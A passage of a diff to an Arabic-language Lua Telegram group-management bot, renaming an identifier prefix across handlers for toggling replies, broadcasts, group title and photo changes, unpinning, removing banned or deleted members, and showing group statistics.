+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل ردود المدير'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Lock:GpRed'..msg.chat_id_,true)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'تفعيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل ردود المطور'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Lock:AllRed'..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل ردود المطور'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Lock:AllRed'..msg.chat_id_)
 end
 if text == 'تعطيل ردود المطور' and Manager(msg) and ChCheck(msg) then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل ردود المطور'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Lock:AllRed'..msg.chat_id_,true)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل ردود المطور'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Lock:AllRed'..msg.chat_id_,true)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if SecondSudo(msg) then
 if text == 'تفعيل المغادره' or text == '↫ تفعيل المغادره ⌁' then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل المغادره بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral.."ALI:Left:Bot"..Jenral)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل المغادره بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL.."ALI:Left:Bot"..JENRAL)
 end
 if text == 'تعطيل المغادره' or text == '↫ تعطيل المغادره ⌁' then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل المغادره بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral.."ALI:Left:Bot"..Jenral,true) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل المغادره بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL.."ALI:Left:Bot"..JENRAL,true) 
 end 
 if text == 'تفعيل الاذاعه' or text == '↫ تفعيل الاذاعه ⌁' then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الاذاعه بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral.."ALI:Send:Bot"..Jenral)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الاذاعه بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL.."ALI:Send:Bot"..JENRAL)
 end
 if text == 'تعطيل الاذاعه' or text == '↫ تعطيل الاذاعه ⌁' then 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الاذاعه بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral.."ALI:Send:Bot"..Jenral,true) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الاذاعه بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL.."ALI:Send:Bot"..JENRAL,true) 
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^ضع اسم (.*)$") and Manager(msg) and ChCheck(msg) then
 local txt = {string.match(text, "^(ضع اسم) (.*)$")}
 tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = txt[2] },function(arg,data) 
@@ -8949,14 +8937,14 @@ end
 if data.message_ == "CHAT_ADMIN_REQUIRED" then
 send(msg.chat_id_,msg.id_,"⌁︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات")  
 else
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تغير اسم المجموعه'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تغير اسم المجموعه'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end
 end,nil) 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if msg.content_.photo_ then
-if DevALI:get(Jenral..'ALI:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
+if DevALI:get(JENRAL..'ALI:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
 if msg.content_.photo_.sizes_[3] then
 photo_id = msg.content_.photo_.sizes_[3].photo_.persistent_id_
 else
@@ -8965,41 +8953,41 @@ end
 tdcli_function ({ID = "ChangeChatPhoto",chat_id_ = msg.chat_id_,photo_ = getInputFile(photo_id) }, function(arg,data)   
 if data.code_ == 3 then
 send(msg.chat_id_, msg.id_,"⌁︙عذرا البوت ليس ادمن يرجى ترقيتي والمحاوله لاحقا") 
-DevALI:del(Jenral..'ALI:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
+DevALI:del(JENRAL..'ALI:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
 return false  end
 if data.message_ == "CHAT_ADMIN_REQUIRED" then 
 send(msg.chat_id_, msg.id_,"⌁︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
-DevALI:del(Jenral..'ALI:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
+DevALI:del(JENRAL..'ALI:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
 else
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تغير صورة المجموعه'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تغير صورة المجموعه'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end
 end,nil) 
-DevALI:del(Jenral..'ALI:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
+DevALI:del(JENRAL..'ALI:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
 end 
 end
 if text and text:match("^ضع صوره$") and ChCheck(msg) or text and text:match("^وضع صوره$") and ChCheck(msg) then
 Dev_ALI(msg.chat_id_,msg.id_, 1, '⌁︙ارسل صورة المجموعه الان', 1, 'md')
-DevALI:set(Jenral..'ALI:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
+DevALI:set(JENRAL..'ALI:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^حذف الصوره$") and ChCheck(msg) or text and text:match("^مسح الصوره$") and ChCheck(msg) then
 https.request("https://api.telegram.org/bot"..TokenBot.."/deleteChatPhoto?chat_id="..msg.chat_id_) 
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف صورة المجموعه")  
 return false  
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if Manager(msg) then
 if text and text:match("^الغاء تثبيت$") and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and ChCheck(msg) then
-if DevALI:sismember(Jenral.."ALI:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
+if DevALI:sismember(JENRAL.."ALI:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
 Dev_ALI(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
 return false  
 end
 tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
 if data.ID == "Ok" then
-DevALI:del(Jenral..'ALI:PinnedMsg'..msg.chat_id_)
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم الغاء تثبيت الرساله'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:PinnedMsg'..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم الغاء تثبيت الرساله'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 return false  
 end
 if data.code_ == 6 then
@@ -9012,18 +9000,18 @@ return false
 end
 end,nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^الغاء تثبيت الكل$") then  
-if DevALI:sismember(Jenral.."ALI:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
+if DevALI:sismember(JENRAL.."ALI:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
 Dev_ALI(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
 return false  
 end
 tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
 if data.ID == "Ok" then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم الغاء تثبيت الكل'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم الغاء تثبيت الكل'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
-DevALI:del(Jenral.."ALI:PinnedMsg"..msg.chat_id_)
+DevALI:del(JENRAL.."ALI:PinnedMsg"..msg.chat_id_)
 return false  
 end
 if data.code_ == 6 then
@@ -9036,20 +9024,20 @@ return false
 end
 end,nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^اعاده تثبيت$") and ChCheck(msg) or text and text:match("^اعاده التثبيت$") and ChCheck(msg) or text and text:match("^اعادة التثبيت$") and ChCheck(msg) then
-if DevALI:sismember(Jenral.."ALI:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
+if DevALI:sismember(JENRAL.."ALI:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
 Dev_ALI(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
 return false  
 end
-local PinId = DevALI:get(Jenral..'ALI:PinnedMsg'..msg.chat_id_)
+local PinId = DevALI:get(JENRAL..'ALI:PinnedMsg'..msg.chat_id_)
 if PinId then
 Pin(msg.chat_id_,PinId,0)
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم اعادة تثبيت الرساله'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم اعادة تثبيت الرساله'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
 end end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'طرد المحذوفين' or text == 'مسح المحذوفين' or text == 'طرد الحسابات المحذوفه' or text == 'حذف المحذوفين' then  
 tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),offset_ = 0,limit_ = 1000}, function(arg,del)
 for k, v in pairs(del.members_) do
@@ -9062,17 +9050,17 @@ end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم طرد المحذوفين")  
 end,nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^مسح المحظورين$") or text and text:match("^حذف المحظورين$") and ChCheck(msg) or text and text:match("^مسح المطرودين$") or text and text:match("^حذف المطرودين$") and ChCheck(msg) then
 local function RemoveBlockList(extra, result)
 if tonumber(result.total_count_) == 0 then 
 Dev_ALI(msg.chat_id_, msg.id_, 0,'⌁︙*لا يوجد محظورين*', 1, 'md')
-DevALI:del(Jenral..'ALI:Ban:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Ban:'..msg.chat_id_)
 else
 local x = 0
 for x,y in pairs(result.members_) do
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
-DevALI:del(Jenral..'ALI:Ban:'..msg.chat_id_)
+DevALI:del(JENRAL..'ALI:Ban:'..msg.chat_id_)
 x = x + 1
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المحظورين")  
@@ -9081,28 +9069,28 @@ end
 tdcli_function({ID="GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersKicked"},offset_ = 0,limit_ = 200}, RemoveBlockList, {chat_id_ = msg.chat_id_, msg_id_ = msg.id_})    
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^معلومات المجموعه$") and ChCheck(msg) or text and text:match("^عدد الاعضاء$") and ChCheck(msg) or text and text:match("^عدد الكروب$") and ChCheck(msg) or text and text:match("^عدد الادمنيه$") and ChCheck(msg) or text and text:match("^عدد المحظورين$") and ChCheck(msg) then
-local Muted = DevALI:scard(Jenral.."ALI:Muted:"..msg.chat_id_) or "0"
+local Muted = DevALI:scard(JENRAL.."ALI:Muted:"..msg.chat_id_) or "0"
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
 tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه ↫ ❨ '..dp.title_..' ❩\n⌁︙الايدي ↫ ❨ '..msg.chat_id_..' ❩\n⌁︙عدد الاعضاء ↫ ❨ *'..data.member_count_..'* ❩\n⌁︙عدد الادمنيه ↫ ❨ *'..data.administrator_count_..'* ❩\n⌁︙عدد المطرودين ↫ ❨ *'..data.kicked_count_..'* ❩\n⌁︙عدد المكتومين ↫ ❨ *'..Muted..'* ❩\n⌁︙عدد رسائل المجموعه ↫ ❨ *'..(msg.id_/2097152/0.5)..'* ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n', 1, 'md') 
 end,nil)
 end,nil)
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match('^كشف (-%d+)') then
 local ChatId = text:match('كشف (-%d+)') 
 if not SudoBot(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطورين فقط', 1, 'md')
 else
-local ConstructorList = DevALI:scard(Jenral.."ALI:Constructor:"..ChatId) or 0
-local BanedList = DevALI:scard(Jenral.."ALI:Ban:"..ChatId) or 0
-local ManagerList = DevALI:scard(Jenral.."ALI:Managers:"..ChatId) or 0
-local MutedList = DevALI:scard(Jenral.."ALI:Muted:"..ChatId) or 0
-local TkeedList = DevALI:scard(Jenral.."ALI:ALI:Tkeed:"..ChatId) or 0
-local AdminsList = DevALI:scard(Jenral.."ALI:Admins:"..ChatId) or 0
-local VipList = DevALI:scard(Jenral.."ALI:VipMem:"..ChatId) or 0
+local ConstructorList = DevALI:scard(JENRAL.."ALI:Constructor:"..ChatId) or 0
+local BanedList = DevALI:scard(JENRAL.."ALI:Ban:"..ChatId) or 0
+local ManagerList = DevALI:scard(JENRAL.."ALI:Managers:"..ChatId) or 0
+local MutedList = DevALI:scard(JENRAL.."ALI:Muted:"..ChatId) or 0
+local TkeedList = DevALI:scard(JENRAL.."ALI:ALI:Tkeed:"..ChatId) or 0
+local AdminsList = DevALI:scard(JENRAL.."ALI:Admins:"..ChatId) or 0
+local VipList = DevALI:scard(JENRAL.."ALI:VipMem:"..ChatId) or 0
 local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
 if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/GENRALTEAM' end
 tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
@@ -9129,7 +9117,7 @@ end,nil)
 end,nil)
 end 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^غادر (-%d+)$")  then
 local Text = { string.match(text, "^(غادر) (-%d+)$")}
 if not SecondSudo(msg) then
@@ -9139,67 +9127,67 @@ tdcli_function({ID ="GetChat",chat_id_=Text[2]},function(arg,dp)
 if dp.id_ then
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙المجموعه ↫ ["..dp.title_.."]\n⌁︙تمت المغادره منها بنجاح", 1, "md")
 Dev_ALI(Text[2], 0, 1, "⌁︙بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
-ChatLeave(dp.id_, Jenral)
-DevALI:srem(Jenral.."ALI:Groups", dp.id_)
+ChatLeave(dp.id_, JENRAL)
+DevALI:srem(JENRAL.."ALI:Groups", dp.id_)
 else
 Dev_ALI(msg.chat_id_, msg.id_, 1, "⌁︙لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
 end 
 end,nil)
 end 
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match("^تعين عدد الاعضاء (%d+)$") and SecondSudo(msg) or text and text:match("^تعيين عدد الاعضاء (%d+)$") and SecondSudo(msg) then
 local Num = text:match("تعين عدد الاعضاء (%d+)$") or text:match("تعيين عدد الاعضاء (%d+)$")
-DevALI:set(Jenral..'ALI:Num:Add:Bot',Num) 
+DevALI:set(JENRAL..'ALI:Num:Add:Bot',Num) 
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد الاعضاء ↫ *'..Num..'* عضو', 1, 'md')
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text == 'تفعيل البوت الخدمي' then 
 if not Sudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
 else 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل البوت الخدمي'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Lock:FreeBot'..Jenral) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل البوت الخدمي'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Lock:FreeBot'..JENRAL) 
 end 
 end
 if text == 'تعطيل البوت الخدمي' then 
 if not Sudo(msg) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 1, 'md')
 else 
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل البوت الخدمي'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Lock:FreeBot'..Jenral,true) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل البوت الخدمي'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Lock:FreeBot'..JENRAL,true) 
 end 
 end
 if ChatType == 'sp' or ChatType == 'gp'  then
 if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الالعاب بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral..'ALI:Lock:Games'..msg.chat_id_) 
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل الالعاب بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL..'ALI:Lock:Games'..msg.chat_id_) 
 end
 if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الالعاب بنجاح'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral..'ALI:Lock:Games'..msg.chat_id_,true)  
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل الالعاب بنجاح'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL..'ALI:Lock:Games'..msg.chat_id_,true)  
 end
 if text == "تفعيل الرابط" or text == "تفعيل جلب الرابط" then 
 if Admin(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل جلب رابط المجموعه'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:del(Jenral.."ALI:Lock:GpLinks"..msg.chat_id_)
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تفعيل جلب رابط المجموعه'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:del(JENRAL.."ALI:Lock:GpLinks"..msg.chat_id_)
 return false  
 end
 end
 if text == "تعطيل الرابط" or text == "تعطيل جلب الرابط" then 
 if Admin(msg) then
-local JenralTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل جلب رابط المجموعه'
-ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JenralTEAM, 14, string.len(msg.sender_user_id_))
-DevALI:set(Jenral.."ALI:Lock:GpLinks"..msg.chat_id_,"ok")
+local JENRALTEAM = '⌁︙اهلا عزيزي ↫ '..ALIRank(msg)..' \n⌁︙تم تعطيل جلب رابط المجموعه'
+ALImoned(msg.chat_id_, msg.sender_user_id_, msg.id_, JENRALTEAM, 14, string.len(msg.sender_user_id_))
+DevALI:set(JENRAL.."ALI:Lock:GpLinks"..msg.chat_id_,"ok")
 return false  
 end
 end
---     Source Jenral     --
+--     Source JENRAL     --
 if text and text:match('^تفعيل$') and SudoBot(msg) and ChCheck(msg) then
 if ChatType ~= 'sp' then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
@@ -9210,8 +9198,8 @@ Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙البوت ليس ادمن يرجى ت�
 return false  
 end
 tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
-if tonumber(data.member_count_) < tonumber(DevALI:get(Jenral..'ALI:Num:Add:Bot') or 0) and not SecondSudo(msg) then
-Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevALI:get(Jenral..'ALI:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
+if tonumber(data.member_count_) < tonumber(DevALI:get(JENRAL..'ALI:Num:Add:Bot') or 0) and not SecondSudo(msg) then
+Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevALI:get(JENRAL..'ALI:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
 return false
 end
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
@@ -9220,35 +9208,35 @@ tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100"
 local admins = abbas.members_
 for i=0 , #admins do
 if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
-DevALI:sadd(Jenral..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)
+DevALI:sadd(JENRAL..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
 if ba.first_name_ == false then
-DevALI:srem(Jenral..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)
+DevALI:srem(JENRAL..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)
 end
 end,nil)
 else
-DevALI:sadd(Jenral..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)
+DevALI:sadd(JENRAL..'ALI:Admins:'..msg.chat_id_, admins[i].user_id_)
 end
 if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
-DevALI:sadd(Jenral.."ALI:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
-DevALI:sadd(Jenral.."ALI:ALIConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevALI:sadd(JENRAL.."ALI:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevALI:sadd(JENRAL.."ALI:ALIConstructor:"..msg.chat_id_,admins[i].user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
 if ba.first_name_ == false then
-DevALI:srem(Jenral.."ALI:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
-DevALI:srem(Jenral.."ALI:ALIConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevALI:srem(JENRAL.."ALI:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevALI:srem(JENRAL.."ALI:ALIConstructor:"..msg.chat_id_,admins[i].user_id_)
 end
 end,nil)  
 end 
 end
 end,nil)
-if DevALI:sismember(Jenral..'ALI:Groups',msg.chat_id_) then
+if DevALI:sismember(JENRAL..'ALI:Groups',msg.chat_id_) then
 Dev_ALI(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد مفعله', 1, 'md')
 else
 ReplyStatus(msg,result.id_,"ReplyBy","⌁︙تم تفعيل المجموعه "..dp.title_)  
-DevALI:sadd(Jenral.."ALI:Groups",msg.chat_id_)
-if not DevALI:get(Jenral..'ALI:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
-DevALI:incrby(Jenral..'ALI:Sudos'..msg.sender_user_id_,1)
-DevALI:set(Jenral..'ALI:SudosGp'..msg.sender_user_id_..msg.chat_id_,"ALI")
+DevALI:sadd(JENRAL.."ALI:Groups",msg.chat_id_)
+if not DevALI:get(JENRAL..'ALI:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
+DevALI:incrby(JENRAL..'ALI:Sudos'..msg.sender_user_id_,1)
+DevALI:set(JENRAL..'ALI:SudosGp'..msg.sender_user_id_..msg.chat_id_,"ALI")
 end
 local Name1 = result.first_name_
 local Name1 = Name1:gsub('"',"") 
@@ -9272,7 +9260,7 @@ LinkGroup = LinkGp.result
 else
 LinkGroup = 'لا يوجد'
 end
-DevALI:set(Jenral.."ALI:Groups:Links"..msg.chat_id_,LinkGroup) 
